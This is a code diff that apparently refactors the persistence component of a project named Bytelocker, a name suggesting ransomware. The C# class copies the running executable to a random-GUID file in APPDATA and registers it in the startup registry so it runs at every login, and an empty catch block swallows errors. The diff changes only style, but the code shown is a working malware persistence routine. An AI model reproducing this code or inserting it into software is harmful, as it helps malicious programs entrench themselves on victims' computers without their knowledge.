@@ -1,54 +1,56 @@
-﻿using Bytelocker.Settings;
-using ByteLocker.Detection;
-using System;
+﻿using System;
+using System.Diagnostics;
 using System.IO;
+using ByteLocker.Detection;
+using Bytelocker.Settings;
 
 namespace Bytelocker.Installer
 {
-    class Persistence
+    internal class Persistence
     {
-        public static String REGISTRY_STARTUP_VALUE_NAME = "Bytelocker";
+        public static string REGISTRY_STARTUP_VALUE_NAME = "Bytelocker";
+        private string new_path;
 
-        private String path;
-        private String new_path;
-        private String random_guid;
+        private string path;
+        private string random_guid;
 
         public Persistence()
         {
-            this.GetRandomGUID();
-            this.GetPath();
-            this.SetNewPath();
-            this.AddToStartup();
-            this.CopyFile();
+            GetRandomGUID();
+            GetPath();
+            SetNewPath();
+            AddToStartup();
+            CopyFile();
         }
 
         private void GetRandomGUID()
         {
-            this.random_guid = RandomFileNameGenerator.GetRandomGUID();
+            random_guid = RandomFileNameGenerator.GetRandomGUID();
         }
 
         private void GetPath()
         {
-            this.path = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
-        }        
+            path = Process.GetCurrentProcess().MainModule.FileName;
+        }
 
         private void SetNewPath()
         {
-            this.new_path = Environment.GetEnvironmentVariable("APPDATA") + @"\" + this.random_guid;
+            new_path = Environment.GetEnvironmentVariable("APPDATA") + @"\" + random_guid;
         }
 
         private void AddToStartup()
         {
-            RegistryManager rm = new RegistryManager();
-            rm.AddItemToStartup(REGISTRY_STARTUP_VALUE_NAME, this.new_path, "");
+            var rm = new RegistryManager();
+            rm.AddItemToStartup(REGISTRY_STARTUP_VALUE_NAME, new_path, "");
         }
 
         private void CopyFile()
         {
             try
             {
-                File.Copy(this.path, this.new_path);
-            } catch (Exception)
+                File.Copy(path, new_path);
+            }
+            catch (Exception)
             {
             }
         }
